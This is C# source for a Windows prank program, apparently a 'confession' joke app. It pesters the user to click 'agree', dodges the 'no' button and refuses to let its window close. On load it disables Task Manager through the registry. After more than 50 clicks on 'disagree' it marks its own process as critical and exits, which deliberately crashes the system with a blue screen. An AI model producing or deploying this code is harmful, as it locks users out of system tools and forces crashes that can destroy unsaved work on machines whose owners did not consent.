
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace I_love_you
{
    public partial class Form1 : Form
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        int clicktimes = 0;
        int movetimes = 0;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_MouseMove(object sender, MouseEventArgs e)
        {
            this.label1.Location = new Point(e.X + 20, e.Y);
            label1.Text = "希望你能够认真选择";

            //this.label1.Text = "当前坐标：" + e.X + "," + e.Y;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //禁用资源管理器
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 1, RegistryValueKind.DWord);
            //将label1显示在求顶层（其它空间之上
            label1.BringToFront();
            //设置label1背景为透明
            label1.BackColor = Color.Transparent;

            Bitmap bmp = new Bitmap(Properties.Resources._1815573_cross_cancel_delete_icon__1_);
            Cursor cursor = new Cursor(bmp.GetHicon());
            label2.Cursor = cursor;

            Bitmap bmp2 = new Bitmap(Properties.Resources._8726173_smile_beam_icon);
            Cursor cursor2 = new Cursor(bmp2.GetHicon());
            this.Cursor = cursor2;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            MessageBox.Show("不能关闭哦亲爱的，要做出你的选择。","你坏坏");
            //取消closing发生
            e.Cancel = true;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            //解除资源管理器禁用
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 0, RegistryValueKind.DWord);
            MessageBox.Show("么么哒，我就知道你对我有兴趣，来做朋友吧♂");
            timer1.Start();
        }

        private void button1_MouseMove(object sender, MouseEventArgs e)
        {
            //设置label1跟随鼠标的位置
            label1.Location = new Point(e.X + 20 + button1.Location.X, e.Y+button1.Location.Y);
            label1.Text = "对对，快点按下去啊！";
        }

        private void button2_MouseMove(object sender, MouseEventArgs e)
        {
            label1.Location = new Point(e.X + 20 + button2.Location.X, e.Y + button2.Location.Y);
            label1.Text = "要不再仔细考虑考虑？";
            if (movetimes < 4)
            {
                if (button2.Location.X == 548)
                {
                    //交换两个按钮位置
                    button2.Location = new Point(85, 301);
                    button1.Location = new Point(548, 301);
                    movetimes++;
                    return;
                }
                else
                {
                    //交换两个按钮位置
                    button2.Location = new Point(548, 301);
                    button1.Location = new Point(85, 301);
                    movetimes++;
                    return;
                }
            }

            if (movetimes < 25)
            {
                if (button2.Location.Y <= 301)
                {
                    button2.Location = new Point(button2.Location.X, button2.Location.Y + 80);
                    movetimes++;
                }
                else
                {
                    button2.Location = new Point(button2.Location.X, button2.Location.Y - 160);
                    movetimes++;
                }
            }
            else
            {
                button2.Location = new Point(548, 301);
            }

        }

        private void label2_MouseMove(object sender, MouseEventArgs e)
        {
            label1.Location = new Point(e.X + 20 + label2.Location.X, e.Y + label2.Location.Y);
            label1.Text = "希望你能够认真选择";
        }

        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
        {
            label1.Location = new Point(e.X + 20 + pictureBox1.Location.X, e.Y + pictureBox1.Location.Y);
            label1.Text = "这个不是我本人的样子哦";
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            if (clicktimes == 5)
            {
                MessageBox.Show("好玩吗？", "别点了");
            }
            clicktimes++;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            MessageBox.Show("请面对我的提议，求你了", "sorry");
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            //一点点设置透明，淡出关闭
            if (this.Opacity >= 0.025)
            {
                this.Opacity -= 0.025;
            }
            else
            {
                timer1.Stop();
                Environment.Exit(0);
            }
        }

        private void flowLayoutPanel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void flowLayoutPanel1_MouseMove(object sender, MouseEventArgs e)
        {
            label1.Location = new Point(e.X + 20 + flowLayoutPanel1.Location.X, e.Y + flowLayoutPanel1.Location.Y);
            label1.Text = "希望你能够认真选择";
        }

        private void button3_MouseMove(object sender, MouseEventArgs e)
        {
            label1.Location = new Point(e.X - 80 + button3.Location.X, e.Y + button3.Location.Y);
            label1.Text = "不要嘛";
        }

        private void button2_Click(object sender, EventArgs e)
        {
            movetimes++;
            if (movetimes <25)
            {
                MessageBox.Show("居然被你点到了，手速挺快啊，但是你还是得点同意");
                return;
            }
            if (movetimes == 26)
            {
                MessageBox.Show("求你了，你最好了");
            }
            else if (movetimes == 27)
            {
                MessageBox.Show("我每天下面给你吃，求你了");
            }
            else if (movetimes == 28)
            {
                MessageBox.Show("你想买什么都给你买");
            }
            else if (movetimes == 29)
            {
                MessageBox.Show("家务我包了");
            }
            else if (movetimes >= 30)
            {
                MessageBox.Show("快去点同意吧，么么哒");
            }

            if (movetimes > 50)
            {
                //点击50次以上就蓝屏
                int isCritical = 1;  // we want this to be a Critical Process
                int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)

                Process.EnterDebugMode();  //acquire Debug Privileges

                // setting the BreakOnTermination = 1 for the current process
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
                try
                {
                    Environment.Exit(0);
                }
                catch(Exception ex)
                {
                    //
                    System.Diagnostics.Process tt = System.Diagnostics.Process.GetProcessById(System.Diagnostics.Process.GetCurrentProcess().Id);
                    tt.Kill();
                }
            }
        }

        private void pictureBox2_MouseMove(object sender, MouseEventArgs e)
        {
            label1.Location = new Point(e.X + 20 + pictureBox2.Location.X, e.Y + pictureBox2.Location.Y);
        }
    }
}
